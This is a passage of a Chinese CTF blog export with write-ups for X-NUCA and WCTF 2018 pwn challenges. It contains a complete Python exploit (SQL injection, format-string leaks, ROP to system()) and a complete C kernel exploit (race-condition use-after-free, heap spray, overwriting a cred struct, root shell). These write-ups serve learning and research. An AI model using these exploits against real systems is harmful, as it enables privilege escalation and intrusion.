&#125; mysql_free_result(v23); mysql_close(v22); &#125;&#125; 这个功能存在一个明显的问题，当查询结果出现overdue字样时，会向栈上拷贝查询结果+64的内存数据，妥妥的栈溢出。不过仍然有坑点，就是mysql查询结果都是字符串，而栈溢出出现利用必须有如0x00007f12345678这样的地址。 虽然可以通过union注入，可以通过类似于 1union select 'aaa...aa',canary+'aaa...aa',onegadget[:-2],'' 这样的方法使返回地址覆盖为onegadget，但是并没有用，因为程序没有输入，得到这个情况，只能使这个进程卡死，第一天晚上就卡在这里了。//最初以为可以DoS搅屎，发现并不能 第二天下午的时候 ，突然想起是否可以让mysql返回存在\x0000这样的数据，Manasseh Zhou提示我可以用unhex，来绕过截断限制，突然发现这样就可以写ROP了。 ROP由于复制长度限制，只能写0x20长，因此好多东西都搞不了，最后想到可以用system(“cat /opt/xnuca/flag.txt”)这样的命令来拿到flag。 但苦于没有合适的位置来构造，只有堆上有这样一条数据，但还加了一个单引号，因为是在SQL语句中，执行system时会卡死等待另一个单引号。 后来想到可以用SQL语句注释的规则来增加一个单引号绕过system执行限制，如用这样的SQL语句： 1union select 'overdueaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',canary data,ROP,'cat /opt/xnuca/flag.txt;echo ';#' 这样最终会执行system(“cat /opt/xnuca/flag.txt;echo ‘;#’”) 就可以拿到flag了，最终的结果是一个ROP写一年，比赛结束后才写完这个ROP……（马后炮体质） EXP2.py123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165from pwn import *ip = "127.0.0.1"def build_rop(libc_addr,heap): rop = '' rop += p64(libc_addr + 0x0000000000021102) rop += p64(heap+392) rop += p64(libc_addr + 283536) #rop += p64(libc_addr + 0x0000000000021102) #rop += p64(heap+415) #rop += p64(libc_addr + 0x000000000003a7a0) #rop += p64(1) #0x000000000003a7a0 : mov dword ptr [rdi], 0 ; xor eax, eax ; pop rbx ; ret #rop += p64(libc_addr + 0x00000000000202e8) #rop += p64(1) #rop += p64(libc_addr + 0x0000000000001b92) #rop += p64(1) #rop += p64(libc_addr + 586160) ''' rop += p64(libc_addr + 0x0000000000021102) rop += p64(heap+392) rop += p64(libc_addr + 0x6f690) ''' #rop += p64(libc_addr + 0x6f690) ''' rop += p64(libc_addr + 0x0000000000021102) rop += p64(heap+390) rop += p64(libc_addr + 0x6f690) ''' #0x0000000000021102 : pop rdi ; ret #0x00000000000202e8 : pop rsi ; ret #0x0000000000001b92 : pop rdx ; ret #rop += p64(libc_addr+0x45216) # strncpy 0x8d3c0 a = "unhex('%s')"%rop.encode('hex') return ap = remote(ip,8080) buf ="""POST /cart.html?cargo=-1); HTTP/1.1\rHost: 127.0.0.1\rUser-Agent: ComputerVendor\rCookie: nilnilnilnil\rConnection: close\rIdentity: unknown\rContent-Length: 10\r\ra=1&amp;cargo=1) union select '%41$p' ;# &amp;"""context.log_level = 'debug'p.send(buf)p.recvuntil('&lt;/html&gt;')canary = int(p.recvuntil('00'),16)print '[+]canary',hex(canary)p = remote(ip,8080) buf ="""POST /cart.html?cargo=-1); HTTP/1.1\rHost: 127.0.0.1\rUser-Agent: ComputerVendor\rCookie: nilnilnilnil\rConnection: close\rIdentity: unknown\rContent-Length: 10\r\ra=1&amp;cargo=1) union select '%44$p' ;# &amp;"""context.log_level = 'debug'p.send(buf)p.recvuntil('&lt;/html&gt;')stack = int(p.recv(14),16)print '[+]canary',hex(stack)p = remote(ip,8080) buf ="""POST /cart.html?cargo=-1); HTTP/1.1\rHost: 127.0.0.1\rUser-Agent: ComputerVendor\rCookie: nilnilnilnil\rConnection: close\rIdentity: unknown\rContent-Length: 10\r\ra=1&amp;cargo=1) union select '%7$p' ;# &amp;"""context.log_level = 'debug'p.send(buf)p.recvuntil('&lt;/html&gt;')heap = int(p.recv(),16)#raw_input()print '[+]heap',hex(heap)p = remote(ip,8080)p = remote(ip,8080)buf ="""POST /cart.html?cargo=-1); HTTP/1.1\rHost: 127.0.0.1\rUser-Agent: ComputerVendor\rCookie: nilnilnilnil\rConnection: close\rIdentity: unknown\rContent-Length: 10\r\ra=1&amp;cargo=1) union select '%75$p' ;# &amp;"""context.log_level = 'debug'p.send(buf)p.recvuntil('&lt;/html&gt;')libc_addr = int(p.recvuntil('30'),16)-0x20830print '[+]libc_addr',hex(libc_addr)p = remote(ip,8080)buf ="""POST /cart.html?product.html HTTP/1.1\rHost: 127.0.0.1\rUser-Agent: ComputerVendor\rCookie: nilnilnilnil\rConnection: close\rIdentity: unknown\rContent-Length: 100\r\ra=1&amp;id=1&amp;"""context.log_level = 'debug'p.send(buf)p.recvuntil('&lt;/html&gt;')p = remote(ip,8080)buf ="""POST /product.html? HTTP/1.1\rHost: 127.0.0.1\rUser-Agent: ComputerVendor\rCookie: nilnilnilnil\rConnection: close\rIdentity: unknown\rContent-Length: 100\r\ra=1&amp;id=111 union select 'overdueaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa','%s',%s,'cat /opt/xnuca/flag.txt;echo ';#'&amp;"""%(p64(canary).replace('\0','')+'aaaaaaaaaaaaaaaaaaaaaaa',build_rop(libc_addr,heap) )#p64(libc_addr+0x45216).replace('\0',''))#context.log_level = 'debug'p.send(buf)#p.recvuntil('&lt;/html&gt;')#print '[+]',p64(canary)[1:]#print '[+++]',len(buf)p.recvuntil('cat /opt/xnuca/flag.txt;echo aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')flag = p.recvline()print '[+] flag',flagp.interactive()'''0x0000000000021102 : pop rdi ; ret0x00000000000202e8 : pop rsi ; ret0x0000000000001b92 : pop rdx ; ret0x6f690 puts\0x18cd57 /bin/sh0x45216 execve("/bin/sh", rsp+0x30, environ)constraints: rax == NULL0x4526a execve("/bin/sh", rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xf02a4 execve("/bin/sh", rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf1147 execve("/bin/sh", rsp+0x70, environ)constraints: [rsp+0x70] == NULL''']]></content>
      <tags>
        <tag>PWN</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【KERNEL PWN】WCTF 2018 klist解题思路]]></title>
    <url>%2F2018%2F11%2F27%2Fwctf-2018-klist%2F</url>
    <content type="text"><![CDATA[题目来源于WCTF 2018，shellphish出的一道比较简单的内核题目，苦于比赛时并不会内核，到今天才重新拿出来复现，附件及题目下载。 题目分析题目模仿磁盘文件机制，可以自由申请、释放、读写堆块。提供了read、write、ioctl三个功能。 其堆块数据结构如下，其中isuse位是一个标志位，使用原子操作对其加减，每次操作前加一，操作后减一，当该位为0时，调用kfree释放。size为存放的是其大小，fd是下一个item的指针，后续是其实际内容： 123456700000000 struct_item struc ; (sizeof=0x20, mappedto_3)00000000 isuse dd ?00000004 field_4 dd ?00000008 size dq ?00000010 fd dq ? ; offset00000018 buf dq ?00000020 struct_item ends ioctl在ioctl里实现了4个功能 add_item可以看到，从copy_from_user可看出，其输入的参数是一个结构体，结构体有两项一个是size，一个是数据buf指针。然后程序会按照请求的size+0x18，kmalloc申请内存，并复制过去，将内存挂在单链表上，并将isuse位置1。 12345678910111213141516171819202122232425262728293031323334signed __int64 __fastcall add_item(add_opt *a1)&#123; struct_item *v1; // rax __int64 v2; // rdx __int64 v3; // rsi struct_item *v4; // rbx struct_item *v5; // rax signed __int64 result; // rax add_opt v7; // [rsp+0h] [rbp-18h] if ( copy_from_user(&amp;v7, a1, 16LL) || v7.size &gt; 0x400uLL ) return -22LL; v1 = (struct_item *)_kmalloc(v7.size + 0x18, 0x14202C0LL);// ___GFP_FS|___GFP_IO|___GFP_NOWARN |___GFP_HARDWALL| ___GFP_DIRECT_RECLAIM|___GFP_KSWAPD_RECLAIM v2 = v7.size; v3 = v7.mem; v1-&gt;isuse = 1; v4 = v1; v1-&gt;size = v2; if ( copy_from_user(&amp;v1-&gt;buf, v3, v2) ) &#123; kfree(v4); result = -22LL; &#125; else &#123; mutex_lock(&amp;list_lock); v5 = g_list; g_list = v4; v4-&gt;fd = v5; mutex_unlock(&amp;list_lock); result = 0LL; &#125; return result;&#125; select_itemselect_item函数也很简单，遍历查找第a2个内存块，然后对该块做get操作，放入(a1 + 200)位置，并对原来的堆块做puts操作。 1234567891011121314151617181920212223242526272829303132333435363738signed __int64 __fastcall select_item(__int64 a1, __int64 a2)&#123; struct_item *v2; // rbx __int64 v3; // rax volatile signed __int32 **v4; // rbp mutex_lock(&amp;list_lock); v2 = g_list; if ( a2 &gt; 0 ) &#123; if ( !g_list ) &#123;LABEL_9: mutex_unlock(&amp;list_lock); return -22LL; &#125; v3 = 0LL; while ( 1 ) &#123; ++v3; v2 = v2-&gt;fd; if ( a2 == v3 ) break; if ( !v2 ) goto LABEL_9; &#125; &#125; if ( !v2 ) return -22LL; get(&amp;v2-&gt;isuse); mutex_unlock(&amp;list_lock); v4 = *(volatile signed __int32 ***)(a1 + 200); mutex_lock(v4 + 1); put(*v4); *v4 = &amp;v2-&gt;isuse; mutex_unlock(v4 + 1); return 0LL;&#125; 可以看到get操作是一个原子性的加法操作 1234void __fastcall get(volatile signed __int32 *a1)&#123; _InterlockedIncrement(a1);&#125; 而put操作是一个原子性的减法，当减为0时，把这块free掉。 1234567891011__int64 __fastcall put(volatile signed __int32 *a1)&#123; __int64 result; // rax if ( a1 ) &#123; if ( !_InterlockedDecrement(a1) ) result = kfree(a1); &#125; return result;&#125; remove_itemremove_item也是根据用户输入的a1，顺序查找链表，当找到后从单链表上摘除，并对其做一个put操作，并不是直接的free，这是为了防止用select_item选择时，将其放到a1+200中，而造成的UAF。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354signed __int64 __fastcall remove_item(__int64 a1)&#123; struct_item *v1; // rax signed __int64 v2; // rdx struct_item *v3; // rdi struct_item *v5; // rdi if ( a1 &gt;= 0 ) &#123; mutex_lock(&amp;list_lock); if ( !a1 ) &#123; v5 = g_list; if ( g_list ) &#123; g_list = g_list-&gt;fd; put(&amp;v5-&gt;isuse); mutex_unlock(&amp;list_lock); return 0LL; &#125; goto LABEL_12; &#125; v1 = g_list; if ( a1 != 1 ) &#123; if ( !g_list ) &#123;LABEL_12: mutex_unlock(&amp;list_lock); return -22LL; &#125; v2 = 1LL; while ( 1 ) &#123; ++v2; v1 = v1-&gt;fd; if ( a1 == v2 ) break; if ( !v1 ) goto LABEL_12; &#125; &#125; v3 = v1-&gt;fd; if ( v3 ) &#123; v1-&gt;fd = v3-&gt;fd; put(&amp;v3-&gt;isuse); mutex_unlock(&amp;list_lock); return 0LL; &#125; goto LABEL_12; &#125; return -22LL;&#125; list_head而最后list_head中，会将第一块内存中的数据返回给用户。注意此时在copy_to_user分别调用了get和put函数，标识该块正在被操作。 12345678910111213unsigned __int64 __fastcall list_head(__int64 a1)&#123; struct_item *v1; // rbx unsigned __int64 v2; // rbx mutex_lock(&amp;list_lock); get(&amp;g_list-&gt;isuse); v1 = g_list; mutex_unlock(&amp;list_lock); v2 = -(signed __int64)((unsigned __int64)copy_to_user(a1, v1, v1-&gt;size + 0x18) &gt;= 1) &amp; 0xFFFFFFFFFFFFFFEALL; put(&amp;g_list-&gt;isuse); return v2;&#125; write &amp; readwrite和read就比较简单了，都是判断内存块中的size是否小于用户请求的大小，如果否就返回给用户数据内容。 而读取的位置正是a1+200，也就明白了，之前select_item的功能是选择read和write函数所对应操作的内存块。 12345678910111213141516171819202122232425262728293031323334353637unsigned __int64 __fastcall list_read(__int64 a1, __int64 a2, unsigned __int64 a3)&#123; __int64 v3; // r12 unsigned __int64 v4; // rbx struct_item **v5; // r13 struct_item *v6; // rsi signed __int64 v7; // rdi unsigned __int64 result; // rax v3 = a2; v4 = a3; v5 = *(struct_item ***)(a1 + 200); mutex_lock(v5 + 1); v6 = *v5; if ( *v5 ) &#123; if ( v6-&gt;size &lt;= v4 ) v4 = v6-&gt;size; v7 = (signed __int64)(v5 + 1); if ( copy_to_user(v3, &amp;v6-&gt;buf, v4) ) &#123; mutex_unlock(v7); result = -22LL; &#125; else &#123; mutex_unlock(v7); result = v4; &#125; &#125; else &#123; mutex_unlock(v5 + 1); result = -22LL; &#125; return result;&#125; 12345678910111213141516171819202122232425262728293031323334353637unsigned __int64 __fastcall list_write(__int64 a1, __int64 buf, unsigned __int64 size)&#123; unsigned __int64 v3; // rbx struct_item **v4; // rbp struct_item *v5; // rdi __int64 v6; // rax signed __int64 v7; // rdi unsigned __int64 result; // rax v3 = size; v4 = *(struct_item ***)(a1 + 200); mutex_lock(v4 + 1); v5 = *v4; if ( *v4 ) &#123; if ( v5-&gt;size &lt;= v3 ) v3 = v5-&gt;size; v6 = copy_from_user(&amp;v5-&gt;buf, buf, v3); v7 = (signed __int64)(v4 + 1); if ( v6 ) &#123; mutex_unlock(v7); result = -22LL; &#125; else &#123; mutex_unlock(v7); result = v3; &#125; &#125; else &#123; mutex_unlock(v4 + 1); result = -22LL; &#125; return result;&#125; 漏洞分析及利用感觉逻辑挺严谨得的，好像并没有什么问题。不过这是站在单线程的考虑，我们看一下启动项run.sh 123#!/bin/shqemu-system-x86_64 -enable-kvm -cpu kvm64,+smep -kernel ./bzImage -append "console=ttyS0 root=/dev/ram rw oops=panic panic=1 quiet kaslr" -initrd ./rootfs.cpio -nographic -m 2G -smp cores=2,threads=2,sockets=1 -monitor /dev/null -nographic 发现是有两个内核、两个线程的，这样是满足内核竞争的条件的。让我们再来以多线程的角度来看看这道题。 好像发现了一点问题，在list_head函数中，put函数的操作直接是g_list-&gt;isuse，但是如果第一块不是之前打印的块呢？如果是一个新块，是否就错杀了好人？看一下是否可行 1234567891011121314151617181920212223242526272829303132unsigned __int64 __fastcall list_head(__int64 a1)&#123; struct_item *v1; // rbx unsigned __int64 v2; // rbx[1] mutex_lock(&amp;list_lock); get(&amp;g_list-&gt;isuse); v1 = g_list;[2] mutex_unlock(&amp;list_lock); v2 = -(signed __int64)((unsigned __int64)copy_to_user(a1, v1, v1-&gt;size + 0x18) &gt;= 1) &amp; 0xFFFFFFFFFFFFFFEALL;[3] put(&amp;g_list-&gt;isuse); return v2;&#125;signed __int64 __fastcall add_item(add_opt *a1)&#123;... ... if ( copy_from_user(&amp;v1-&gt;buf, v3, v2) ) &#123; kfree(v4); result = -22LL; &#125; else &#123;[4] mutex_lock(&amp;list_lock); v5 = g_list; g_list = v4; v4-&gt;fd = v5;[5] mutex_unlock(&amp;list_lock); result = 0LL; &#125;&#125; 可以发现&amp;list_lock这个锁，在[2]处就释放了，而put操作在[3]处。 而add_item中仅要求能获得这个锁就可以插入了[4]、[5]，如此看来是完全可以做到的，利用线程间add_item和list_head竞争，可以让第一个堆块变成一个已经释放的堆块（即在一个线程的执行在[2]、[3]之间时，恰好另一个进程进入[4]）。 这样我们就通过竞争条件拿到了一个悬垂指针，而且悬垂指针的大小是任意控制的。 但是拿到这样一个指针并不好弄，针对于之前做过的题目，比如CISCN的babydriver里面的两种做法，第一种是利用申请和cred大小相同的块来UAF另一个线程的cred结构体，从而提权，但在此题行不通。 此题申请cred结构体用的是这个slab中的cred_jar内容： 12345678910111213141516171819202122struct cred *prepare_creds(void)&#123; struct task_struct *task = current; const struct cred *old; struct cred *new; validate_process_creds(); new = kmem_cache_alloc(cred_jar, GFP_KERNEL); if (!new) return NULL; kdebug("prepare_creds() alloc %p", new); old = task-&gt;cred; memcpy(new, old, sizeof(struct cred)); atomic_set(&amp;new-&gt;usage, 1); set_cred_subscribers(new, 0); get_group_info(new-&gt;group_info); get_uid(new-&gt;user); get_user_ns(new-&gt;user_ns); 而kmalloc会根据size的大小，转换为kmalloc-xx中去申请堆块，虽然二者大小是相同的，但是存在完全的隔离。不同种类的slab是不可能交叉使用的。 而且，我想清楚这个问题以后，我重新调试了一下babydriver这题，惊讶的发现在/proc/slabinfo里居然没有cred_jar这个slab，而且192(cred大小0xa8对齐成 0xc0)的slab只有kmalloc-192、dentry、dma-kmalloc-192，而dentry是目录节点显然不是cred，这就很懵逼… 12345678/ # cat /proc/slabinfo|grep jar/ # cat /proc/slabinfo|grep 192TCP 0 0 1920 8 4 : tunables 0 0 0 : slabdata 0 0 0dentry 7731 7791 192 21 1 : tunables 0 0 0 : slabdata 371 371 0dma-kmalloc-8192 0 0 8192 4 8 : tunables 0 0 0 : slabdata 0 0 0dma-kmalloc-192 0 0 192 21 1 : tunables 0 0 0 : slabdata 0 0 0kmalloc-8192 8 8 8192 4 8 : tunables 0 0 0 : slabdata 2 2 0kmalloc-192 1029 1029 192 21 1 : tunables 0 0 0 : slabdata 49 49 0 在prepare_creds这个函数下断点，惊讶的发现cred的分配用的就是kmalloc-192，不禁怀疑人生，这内核咋编译的，还是有别的操作，所以降低了这题的难度，有了直接UAF cred的操作…. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657 0xffffffff810a167d mov esi, 0x24000c0 0xffffffff810a1682 mov rbp, rsp 0xffffffff810a1685 push r12 0xffffffff810a1687 push rbx 0xffffffff810a1688 mov r12, qword ptr gs:[0xbe00] ► 0xffffffff810a1691 call 0xffffffff811ea400 0xffffffff810a1696 test rax, rax 0xffffffff810a1699 je 0xffffffff810a1759 0xffffffff810a169f mov rbx, rax 0xffffffff810a16a2 mov rax, qword ptr [r12 + 0x5f8] 0xffffffff810a16aa mov ecx, 0x15──────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────00:0000│ rsp 0xffff880000957d98 ◂— 0x120001101:0008│ 0xffff880000957da0 —▸ 0xffff880007883fc0 ◂— 0x002:0010│ rbp 0xffff880000957da8 —▸ 0xffff880000957dd8 —▸ 0xffff880000957eb8 —▸ 0xffff880000957f38 —▸ 0xffff880000957f48 ◂— ...03:0018│ 0xffff880000957db0 —▸ 0xffffffff810a1a0f ◂— 0x840fc38948c0854804:0020│ 0xffff880000957db8 —▸ 0x1b7cb50 ◂— 0x5c /* '\\' */05:0028│ 0xffff880000957dc0 ◂— 0x120001106:0030│ 0xffff880000957dc8 —▸ 0xffff880007883fc0 ◂— 0x007:0038│ 0xffff880000957dd0 ◂— 0x0────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────── ► f 0 ffffffff810a1691 f 1 1200011 f 2 ffff880007883fc0 f 3 ffff880000957dd8 f 4 ffffffff810a1a0f f 5 1b7cb50 f 6 1200011 f 7 ffff880007883fc0 f 8 0pwndbg&gt; i r rdirdi 0xffff880006801800 -131941286275072pwndbg&gt; x /40gx 0xffff8800068018000xffff880006801800: 0x0000000000019ee0 0x00000000400000000xffff880006801810: 0x0000000000000005 0x000000c0000000c00xffff880006801820: 0x0000001e00000000 0x00000000000000150xffff880006801830: 0x0000000000000015 0x00000000000000150xffff880006801840: 0x0000000400000000 0x00000000000000000xffff880006801850: 0x00000008000000c0 0x00000000000000000xffff880006801860: 0xffffffff81ce010b 0xffff8800068019680xffff880006801870: 0xffff880006801768 0xffff8800078450600xffff880006801880: 0xffff880006801980 0xffff8800068017800xffff880006801890: 0xffff880006afbb58 0xffff880006afbb400xffff8800068018a0: 0xffffffff81e711c0 0xffff8800078488e80xffff8800068018b0: 0x0000000700000002 0x00000000000000010xffff8800068018c0: 0xffff8800068018c0 0xffff8800068018c00xffff8800068018d0: 0x0000000000000000 0x00000000000000000xffff8800068018e0: 0x0000000000000000 0xffff88000783e3c00xffff8800068018f0: 0x00000000000003e8 0xffff880006800e400xffff880006801900: 0x0000000000019ec0 0x00000000400000000xffff880006801910: 0x0000000000000005 0x00000080000000800xffff880006801920: 0x0000001e00000000 0x00000000000000200xffff880006801930: 0x0000000000000020 0x0000000000000020pwndbg&gt; x /s 0xffffffff81ce010b0xffffffff81ce010b: "kmalloc-192" 然而，用劫持ptmx这种方法也不行，因为缺少地址泄露… 最后一种方法是利用本身的结构，如果我们可以找到一个函数申请到这个堆块，并把size位置的很大，也可以用来越界读写，由于这个堆块也是在映射区里，所以当cred结构体在高地址时，同样是可以覆写的，就类似于zer0fs那题。 不过，内核太大了，调kmalloc或者kmem_cache_alloc(kmalloc-xx)的太多，真的没办法一个一个试出来… 场面一度非常尴尬，调试这堆调用kmalloc函数花了我两天的时间… 卡了好久以后，发现一篇文章《Linux Kernel universal heap spray》，这篇文章竟然说的就是我遇到的这个问题，在竞争条件时如何找一个能精准控制的内容的函数。 我没有使用文章提出的终极解决方案，我用了第一种不是很完善的方案就是do_msgsnd函数，虽然前48字节不可控，但是结构体的第二个参数是指针，要知道内核的地址都是0xfffffffxxxxx之类的，原因大于我们需求的范围，从而可以爆破高地址的内存，如果存在一个cred的话，就可以提权了。 遇到最坑的事儿是，内核里启动了两个uid=1000的进程，一个qemu起的给用户交互这个，另外一个是子进程起EXP这个… 脚本几次都把父进程提权了，子进程提示提权失败… 也是绝望，不过也算是提取成功了吧… 还有就是memmem这个函数，emmmmm，真是略坑。 EXP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193#define _GNU_SOURCE /* See feature_test_macros(7) */#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/msg.h&gt;#include &lt;sys/mman.h&gt;#include &lt;string.h&gt;#define ADD_ITEM 0x1337#define SELECT_ITEM 0X1338#define REMOVE_ITEM 0X1339#define LIST_HEAD 0X133A#define BUFF_SIZE 96-48#define MEM_SIZE 0X300000struct add_opt&#123; size_t size; char * mem;&#125;;void print_hex(char *buf,int size)&#123; int i; puts("======================================"); printf("data :\n"); for (i=0 ; i&lt;(size/8);i++)&#123; if (i%2 == 0)&#123; printf("%d",i/2); &#125; printf(" %16llx",*(size_t * )(buf + i*8)); if (i%2 == 1)&#123; printf("\n"); &#125; &#125; puts("======================================");&#125;int add_item(int fd,size_t size,char * content)&#123; struct add_opt opt; opt.size = size; opt.mem = malloc(size); if (opt.mem == 0)&#123; return -1; &#125; memcpy(opt.mem,content,size); ioctl(fd,ADD_ITEM,&amp;opt); return 0;&#125;int list_head(int fd,char *mem)&#123; if (mem!=0)&#123; ioctl(fd,LIST_HEAD,mem); return 0; &#125;&#125;int select_item(int fd,size_t idx)&#123; ioctl(fd,SELECT_ITEM,idx); return 0;&#125;int remove_item(int fd,size_t idx)&#123; ioctl(fd,REMOVE_ITEM,idx); return 0;&#125;int myMemmem(char * a, int alen, char * b, int blen)&#123; int i, j; for (i = 0; i &lt;= alen - blen; ++ i) &#123; for (j = 0; j &lt; blen; ++ j) &#123; if (a[i + j] != b[j]) &#123; break; &#125; &#125; if (j &gt;= blen) &#123; return i; &#125; &#125; return -1;&#125;void set_cred_root(char *cred,int len,int id)&#123; int i; for(i=0;i&lt;len;i+=4)&#123; if(*(int *)(cred+i) == id ) *(int *)(cred+i) =0; &#125;&#125;int main()&#123; static int fd ; int i,mem_len; setvbuf(stdout, 0LL, 2, 0LL); //char a[]="p4nda"; char *mem = malloc(0x1000); char *result = malloc(0x1000); char *large_mem = NULL; int found = NULL; char cred[0x20]; char *final = 0; fd = open("/dev/klist",O_RDWR); if(fd &lt; 0)&#123; puts("[-] open file error!"); exit(-1); &#125; for(i = 0; i&lt;0x1000;i++)&#123; mem[i] = 'a'; &#125; add_item(fd,96-0x18,mem); if(fork()==0)&#123; int j = 0; for(;j&lt;1000;j++)&#123; add_item(fd,96-0x18,mem); list_head(fd,result); //print_hex(result,0x10); if (*(int *)result == 1)&#123; printf("[+] now we trigger a UAF chunk,with [%d] chunk\n",j); //puts(); print_hex(result,0xc0); exit(-1); &#125; &#125; exit(0); &#125; for(i = 0;i&lt;3000;i++)&#123; list_head(fd,result); &#125; getchar(); if(fork()==0)&#123; for (i=0;i&lt;20;i++)&#123; printf("%d",i); system("./pwn_msg"); &#125; exit(0); &#125; sleep(3); select_item(fd,0); read(fd,result,0x1000); print_hex(result,0xc0); if(*(size_t * )result == 0x6161616161616161) &#123; puts("[-] cannot realloc the chunk "); exit(-1); &#125; puts("[+] now we can read everywhere"); //read(fd,result,0x1000); //print_hex(result,0xc0); large_mem = malloc(MEM_SIZE);//mmap(0,MEM_SIZE,PROT_READ|PROT_WRITE,MAP_ANONYMOUS,0,0); if (large_mem == 0xffffffffffffffff )&#123; puts("[-] cannot mmap large memory"); exit(-1); &#125; printf("[+] mmap addr %p\n",large_mem); memset(large_mem,MEM_SIZE,0); print_hex(large_mem,0x100); mem_len = read(fd,large_mem,MEM_SIZE); printf("[+] read %d byte\n", mem_len ); print_hex(large_mem,0x100); //memcpy(cred,) *(size_t *)cred = 0x000003e800000003; *(size_t *)(cred+8) = 0x000003e8000003e8; *(size_t *)(cred+0x10) = 0x000003e8000003e8; *(size_t *)(cred+0x18) = 0x000003e8000003e8; found = myMemmem(large_mem,MEM_SIZE,cred,0x20); if (found==-1)&#123; puts("[-]cannot find cred struct !"); exit(-1); &#125; printf("[+] start %p\n",large_mem); final = found+large_mem; printf("[+] found %p\n",final); print_hex(final-0x8,0xb0); set_cred_root(final-0x8,0x40,1000); print_hex(final-0x8,0xb0); getchar(); write(fd,large_mem,found+0xb0); //system("/bin/sh"); if (getuid() == 0)&#123; printf("[+]now you are r00t,enjoy ur shell\n"); system("/bin/sh"); &#125; else&#123; puts("[-] there must be something error ... "); exit(-1); &#125;&#125; 参考https://xz.aliyun.com/t/2814 https://cyseclabs.com/blog/linux-kernel-heap-spray https://blog.csdn.net/vanbreaker/article/details/7694648 https://blog.csdn.net/vanbreaker/article/details/7695264 https://blog.csdn.net/lukuen/article/details/6935068]]></content>
      <tags>
        <tag>KERNEL</tag>
        <tag>PWN</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[X-NUCA'2018 secretcenter 解题思路]]></title>
    <url>%2F2018%2F11%2F26%2FXNUCA-secretcenter%2F</url>
    <content type="text"><![CDATA[此题是X-NUCA’2018的一道题目，在比赛过程中没有队伍解出。赛后在得到AFang师傅的提示后复现成功，感谢AFang师傅。题目及附件下载 本文的先知社区链接：https://xz.aliyun.com/t/3431 题目及漏洞分析题目中初始化过程中首先从’secret.txt’中读入一个字符串，存放在申请的堆中。 1234567891011121314int get_secret()&#123; int v0; // eax int v1; // ebx bss_malloc_secret = malloc(0x78uLL); v0 = open("secret.txt", 0x80000); if ( v0 == -1 ) exit(1); v1 = v0; if ( (unsigned int)read(v0, bss_malloc_secret, 0x78uLL) == -1 ) exit(1); return close(v1);&#125; 用户可以输入size申请不大于0x18f大小堆块，并向堆块中输入内容，内容首先输入在栈上，然后通过memcpy复制到堆上，此时栈上是有用户输入的。然后逐字节与secret.txt读入的内容比较，判断是否相等。当相同字节数等于strlen(secret)时，会调用一个函数，这个函数会通过读取/proc/self/maps文件，给出程序的内存空间分布，最终将用户的输入输出到stderr文件，此处用了_fprintf_chk函数，是fprintf的安全版本，存在一个格式化字符串漏洞，但是由于是向stderr输出，并不会返回给用户，无法泄露地址。 1234567891011121314151617181920212223242526272829303132333435363738unsigned __int64 input()&#123; int v0; // ebp unsigned __int64 v1; // kr08_8 int i; // eax __int64 v3; // rbx size_t size; // [rsp+Ch] [rbp-22Ch] unsigned __int64 v6; // [rsp+218h] [rbp-20h] v6 = __readfsqword(0x28u); puts("Secret Size: "); LODWORD(size) = 0; scanf("%d", &amp;size); v0 = size; if ( (unsigned int)(size - 0x65) &gt; 0x12A ) exit(1); bss_malloc_user = malloc((unsigned int)size); bss_size = v0; write(1, "Content: \n", 0xAuLL); syscall(0LL, 0LL, (char *)&amp;size + 4, (unsigned int)size); memcpy(bss_malloc_user, (char *)&amp;size + 4, (unsigned int)size); v1 = strlen((const char *)bss_malloc_secret) + 1; for ( i = 0; ; ++i ) &#123; v3 = i; if ( i &gt;= v1 - 1 ) break; if ( *((_BYTE *)bss_malloc_secret + i) != *((_BYTE *)bss_malloc_user + i) ) &#123; puts("Not Good Secret :P\n"); break; &#125; &#125; if ( v3 == strlen((const char *)bss_malloc_secret) ) give_vmmap(); _fprintf_chk((__int64)stderr, 1LL, (__int64)&amp;size + 4); return __readfsqword(0x28u) ^ v6;&#125; 在释放函数中，程序可以对input函数中申请的堆块释放，但没有把指针清空，存在悬垂指针，导致double free。 1234void delete()&#123; free(bss_malloc_user);&#125; 并且可以通过edit函数，对之前的堆块进行修改，由于悬垂指针的问题，存在UAF。 1234567891011__int64 edit_secret()&#123; unsigned int v1; // [rsp+Ch] [rbp-Ch] write(1, "size: \n", 7uLL); scanf("%d", &amp;v1); if ( (signed int)v1 &lt;= 0 || v1 &gt;= bss_size ) exit(1); write(1, "Content: \n", 0xAuLL); return syscall(0LL, 0LL, bss_malloc_user, v1);&#125; 此外，用户可以通过guard_ready函数，首先通过malloc申请一个0xf0的堆块，并且对这个堆块初始化一些数据，这个数据是一段预置的seccomp规则，后续再说。 